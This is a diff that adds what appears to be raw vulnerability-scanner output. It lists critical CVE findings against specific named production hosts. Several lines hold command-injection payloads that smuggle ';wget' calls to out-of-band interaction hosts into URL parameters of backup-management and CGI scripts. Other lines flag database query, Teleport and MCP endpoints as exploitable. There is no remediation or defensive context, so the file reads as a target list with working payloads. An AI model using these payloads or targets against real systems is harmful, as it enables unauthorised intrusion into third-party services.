@@ -1,0 +1,15 @@
+[CVE-2014-3206] [http] [critical] https://ddocs-indexer.fileverse.io/backupmgt/localJob.php?session=fail;wget+http://d94457tulefjdnsorvog3z6z46kqoitsc.oast.fun;
+[CVE-2014-3206] [http] [critical] https://ddocs-indexer.fileverse.io/backupmgt/pre_connect_check.php?auth_name=fail;wget+http://d94457tulefjdnsorvogbe5w7fmugdk9y.oast.fun;
+[CVE-2014-3206] [http] [critical] https://identity-v1.fileverse.io/backupmgt/localJob.php?session=fail;wget+http://d9446ltulefjee89v1o0hw9qbyba14jo7.oast.live;
+[CVE-2014-3206] [http] [critical] https://identity-v1.fileverse.io/backupmgt/pre_connect_check.php?auth_name=fail;wget+http://d9446ltulefjee89v1o0taneok1y1ccsu.oast.live;
+[CVE-2019-20933] [http] [critical] https://remote-write.switchboard.xyz/query?db=db&q=SHOW%20DATABASES
+[CVE-2022-2488] [http] [critical] https://ddocs-indexer.fileverse.io/cgi-bin/touchlist_sync.cgi?IP=;wget+http://d94457tulefjdnsorvoggwwar35d5iqb5.oast.fun;
+[CVE-2022-2488] [http] [critical] https://identity-v1.fileverse.io/cgi-bin/touchlist_sync.cgi?IP=;wget+http://d9446ltulefjee89v1o0ziqm1186onp77.oast.live;
+[CVE-2025-49825] [http] [critical] https://teleport.infra.switchboard.xyz/webapi/ping ["Teleport Version: 17.5.1"]
+[CVE-2025-55182] [http] [critical] https://xxl-job.orderly.network
+[CVE-2026-33032] [http] [critical] https://btc-mainnet-backend.phantom.app/mcp_message
+[CVE-2026-33032] [http] [critical] https://eth-mainnet-backend.phantom.app/mcp_message
+[CVE-2026-33032] [http] [critical] https://eth-sepolia-backend.phantom.app/mcp_message
+[CVE-2026-33032] [http] [critical] https://polygon-amoy-backend.phantom.app/mcp_message
+[CVE-2026-33032] [http] [critical] https://polygon-mainnet-backend.phantom.app/mcp_message
+[CVE-2026-33032] [http] [critical] https://solana-mainnet-history-backend.phantom.app/mcp_message
